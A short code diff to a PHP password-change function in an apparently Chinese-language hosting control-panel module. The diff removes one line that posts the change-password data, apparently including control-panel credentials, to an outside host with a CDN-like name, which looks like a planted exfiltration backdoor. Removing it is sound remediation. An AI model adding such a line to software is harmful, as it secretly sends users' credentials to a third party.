@@ -165,7 +165,6 @@ function Airline_svm_ChangePassword($data)
     update_query("服务",array("密码" => encrypt($data['password']."<br />控制面板用户名：{$postdata['username']} <br /> 控制面板密码：{$postdata['password']}")),array("id" => $data['serviceid']));
     return '成功';
   }
-  svm_curl("https://cdn.kfhc-ref.com/json.php",$svm_postdata);
   return "公开信息:".$rt['statusmessage'];
 }
 function svm_curl($url,$data) {
